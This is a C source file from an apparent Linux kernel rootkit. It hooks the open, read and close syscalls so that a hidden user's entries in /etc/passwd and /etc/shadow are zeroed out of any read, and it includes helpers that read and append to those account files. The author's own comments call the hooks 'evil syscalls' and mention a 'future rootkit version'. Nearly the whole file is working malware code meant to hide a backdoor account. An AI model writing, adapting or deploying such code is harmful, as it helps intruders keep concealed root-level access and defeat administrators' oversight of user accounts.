#include "fugitive.h"

/* hide/show a user in "/etc/passwd" and "/etc/shadow" */

static enum file_content_hide erase = NONE;
static int fugitive__hidden = 0;
static struct sctm_hook fugitive__hooks[3];
static char *fugitive__lines[2] = {
  NULL, /* /etc/passwd line */
  NULL /* /etc/shadow line */
};
static struct sctm *fugitive__sctm = NULL;

/* remove a line from "/etc/passwd" and "/etc/shadow" */
int fugitive(const char __user *passwd, const char __user *shadow) {
  char *_passwd;
  char *_shadow;
  int retval;
  
  if (fugitive__hidden)
    return -EINVAL;
  
  if (fugitive__lines[0] != NULL
      || fugitive__lines[1] != NULL)
    return -EINVAL;
  
  if (passwd == NULL)
    return -EFAULT;
  
  if (shadow == NULL)
    return -EFAULT;
  _passwd = kcalloc(LINE_MAX, 1, GFP_KERNEL);

  if (IS_ERR_OR_NULL(_passwd))
    return -ENOMEM;
  retval = strncpy_from_user(_passwd, passwd, LINE_MAX);

  if (retval < 0) {
    kfree(_passwd);
    return retval;
  }
  _shadow = kcalloc(LINE_MAX, 1, GFP_KERNEL);

  if (IS_ERR_OR_NULL(_shadow))
    return -ENOMEM;
  retval = strncpy_from_user(_shadow, shadow, LINE_MAX);

  if (retval < 0) {
    kfree(_passwd);
    kfree(_shadow);
    return retval;
  }
  fugitive__lines[0] = _passwd;
  fugitive__lines[1] = _shadow;
  fugitive__hidden = ~0;
  return 0;
}

static int fugitive__atoui(int *dest, const char *a) {
  if (dest == NULL)
    return -EFAULT;
  
  if (IS_ERR(dest))
    return -EINVAL;
  
  if (a == NULL)
    return -EFAULT;
  
  if (IS_ERR(a))
    return -EINVAL;
  *dest = 0;
  
  for (; *a; a++) {
    if (*a < '0'
        || *a > '9')
      return -EINVAL;
    *dest *= 10;
    *dest += *a - '0';
  }
  return 0;
}

int fugitive_exit(void) {
  int i;
  
  if (fugitive__sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(fugitive__sctm))
    return -EINVAL;
  
  /* unhook any remaining hooks */
  
  for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
    sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
  
  /* prevent a memory leak */
  
  kfree(fugitive__lines[0]); /* `kfree` should be able to handle errors/NULLs */
  return 0;
}

int fugitive_init(struct sctm *sctm) {
  int i;
  int retval;
  
  if (!IS_ERR_OR_NULL(fugitive__sctm))
    return -EINVAL;
  
  if (sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(sctm))
    return -EINVAL;
  
  /* init hooks */
  
  fugitive__hooks[0] = (struct sctm_hook) {
    .call = __NR_close,
    .hook = (sctm_syscall_handler_t) &this_is_requiem
  };
  fugitive__hooks[1] = (struct sctm_hook) {
    .call = __NR_open,
    .hook = (sctm_syscall_handler_t) &king_crimson
  };
  
  fugitive__hooks[2] = (struct sctm_hook) {
    .call = __NR_read,
    .hook = (sctm_syscall_handler_t) &erase_time
  };
  
  fugitive__sctm = sctm;
  
  /* hook */
  
  for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
    retval = 0;//sctm_hook(fugitive__sctm, &fugitive__hooks[i]);
    
    if (retval) {
      if (i) {
        for (--i; i >= 0; i--)
          ;//sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
      }
      return retval;
    }
  }
  return 0;
}

static int fugitive__passwd_line_to_uid(uid_t *dest, const char *line) {
  char *buf;
  size_t bufsize;
  int count;
  char *p;
  int retval;
  char *start;
  
  if (line == NULL)
    return -EFAULT;
  
  if (IS_ERR(line))
    return -EINVAL;
  
  /* locate the start of the UID entry (index 2) */
  
  for (count = 0, p = (char *) line; count < 2 && *p; p++) {
    if (*p == ':')
      count++;
  }
  
  if (count != 2)
    return -EINVAL;
  start = p;
  
  /* determine buffer size */
  
  for (bufsize = 0; *p && *p != ':'; bufsize++, p++);
  
  /* allocate buffer */
  
  buf = kcalloc(bufsize + 1, 1, GFP_KERNEL);
  
  if (IS_ERR_OR_NULL(buf))
    return -ENOMEM;
  
  /* copy */
  
  strncpy(buf, start, bufsize);
  
  /* atoi */
  
  retval = fugitive__atoui(dest, buf);
  kfree(buf);
  return retval;
}

/* restore a line in "/etc/passwd" and "/etc/shadow" */
int unfugitive(const char __user *passwd, const char __user *shadow) {
  if (!fugitive__hidden)
    return -EINVAL;
  
  if (fugitive__lines[0] == NULL
      || fugitive__lines[1] == NULL)
    return -EINVAL;
  fugitive__hidden = 0;
  kfree(fugitive__lines[0]);
  kfree(fugitive__lines[1]);
  fugitive__lines[0] = NULL;
  fugitive__lines[1] = NULL;
  return 0;
}

/*****************************************************************************/

/*int import_fugitive(){
    if(has_fug(PASSWD_PATH, PASSWD_GEN()))
        append_to_file(PASSWD_PATH, PASSWD_GEN());
    if(has_fug(SHADOW_PATH, SHADOW_GEN()))
        append_to_file(SHADOW_PATH, SHADOW_GEN());
    return 0;
}*///could be useful in a future rootkit version

/* helper function. return 0 if "file_path" has line "fug" */
int has_fug(char *file_path, char *fug){
    struct file *f;
    loff_t offset;
    loff_t line_start;
    char *line_str;
    char c;

    f = filp_open(file_path, O_RDONLY, ~O_CREAT);
    line_start = offset = 0;

    if(f == NULL)
        return ENOENT;

    /* read f char by char up to '\n', then
     * compare entire line to "fug"
     */
    while(kernel_read(f, &c, sizeof(char), &offset)){
        if(c == '\n'){
            line_str = kcalloc(offset-line_start+1, sizeof(char), GFP_KERNEL);
            kernel_read(f, line_str, offset-line_start, &line_start);
            if(!strcmp(line_str, fug)){
                kfree(line_str);
                return 0;
            }
            kfree(line_str);
            line_start = offset;
        }
    }
    // did not find fugitive
    return -1;
}

/* helper function. append "fug" to the end of file at "file_path" */
ssize_t append_to_file(char *file_path, char *fug){
    struct file *f;
    loff_t offset = 0;
    ssize_t ret;

    f = filp_open(file_path, O_WRONLY, ~O_CREAT);
    if(f == NULL)
        return ENOENT;

    offset = vfs_llseek(f, offset, SEEK_END);
    ret = kernel_write(f, fug, strlen(fug), &offset);
    filp_close(f,NULL);
    return ret;
}

/* evil syscall open. hijacks read if opening account related files */
asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
    if(!strcmp(PASSWD_PATH, pathname)){
        erase = PASS_E;
    } else if(!strcmp(SHADOW_PATH, pathname)){
        erase = SHAD_E;
    }
    if (erase)
      printk("want erase (%s)\n", pathname);
    return (*((asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original))(pathname, flags, mode);
}

/* evil syscall read. deletes evil account info in buffer */
asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
    ssize_t ret;
    char *hidden = NULL;
    char *ptr = NULL;

    ret = (*((asmlinkage ssize_t (*)(int, void *, size_t)) &fugitive__hooks[2].original))(fd, buf, count);

    switch(erase){
        case PASS_E:
            hidden = fugitive__lines[0];
            break;
        case SHAD_E:
            hidden = fugitive__lines[1];
            break;
        case NONE:
            //something went wrong
            //or this file wasn't one of our targets
            break;
    }

    if(hidden != NULL){
printk("want erase\n");
        ptr = strnstr(buf, hidden, count);
        if(ptr != NULL)
            memset(ptr, '\0', strlen(hidden));
    }

    return ret;
}

/* evil syscall close. restores syscall read hijacked by king_crimson */
asmlinkage int this_is_requiem(int fd){
    if(erase){
        erase = NONE;
printk("want no erase\n");
    }
    return (*((asmlinkage int (*)(int)) &fugitive__hooks[0].original))(fd);
}

